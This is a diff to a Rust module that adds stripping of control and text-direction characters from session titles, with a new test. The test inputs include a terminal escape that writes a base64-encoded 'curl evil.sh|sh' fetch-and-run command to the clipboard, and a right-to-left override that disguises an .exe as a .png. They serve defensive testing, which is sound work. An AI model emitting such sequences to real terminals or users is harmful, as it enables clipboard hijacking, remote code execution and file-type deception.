@@ -1,17 +1,35 @@
 //! Derived names: session titles, slugs, branch names.
 
-/// A title from the first meaningful line of a prompt, at most 72 characters.
+/// A title from the first meaningful line of a prompt, at most 72
+/// characters, without the characters terminals act on or that turn text
+/// around ([`plain`]): prompts come from people, schedules, Linear tickets
+/// and other tools, and titles reach terminals (`fctl sessions`).
 pub fn title_from_prompt(prompt: &str) -> String {
     let line = prompt
         .lines()
         .map(|l| {
-            l.trim()
+            plain(l)
+                .trim()
                 .trim_start_matches(['#', '>', '-', '*', ' '])
                 .trim()
+                .to_owned()
         })
         .find(|l| !l.is_empty())
-        .unwrap_or("Untitled session");
-    truncate_words(line, 72)
+        .unwrap_or_else(|| "Untitled session".to_owned());
+    truncate_words(&line, 72)
+}
+
+/// One line of text as titles keep it: tabs and other whitespace become
+/// spaces, and control characters and those that turn text around
+/// (`crate::files::bidi_control`) go.
+pub fn plain(text: &str) -> String {
+    text.chars()
+        .filter_map(|c| match c {
+            c if c.is_whitespace() => Some(' '),
+            c if c.is_control() || crate::files::bidi_control(c) => None,
+            c => Some(c),
+        })
+        .collect()
 }
 
 /// A title for a task that is only files: `screenshot.png`, or
@@ -130,6 +148,21 @@ mod tests {
         let t = title_from_prompt(long);
         assert!(t.chars().count() <= 72, "{t}");
         assert!(t.ends_with('…'));
+    }
+
+    #[test]
+    fn titles_leave_out_what_terminals_act_on() {
+        // An escape sequence that sets the clipboard, then the title.
+        let t = title_from_prompt("\x1b]52;c;Y3VybCBldmlsLnNofHNo\x07Fix the flaky test");
+        assert!(!t.chars().any(char::is_control), "{t:?}");
+        assert!(t.ends_with("Fix the flaky test"), "{t:?}");
+        assert_eq!(title_from_prompt("Fix\tthe\u{9b}2J test"), "Fix the2J test");
+        // Text turned around: invoice\u{202E}gnp.exe shows as invoiceexe.png.
+        assert_eq!(
+            title_from_prompt("Open invoice\u{202E}gnp.exe"),
+            "Open invoicegnp.exe"
+        );
+        assert_eq!(title_from_prompt("\x1b\x07\n\u{200F}\nFix it"), "Fix it");
     }
 
     #[test]
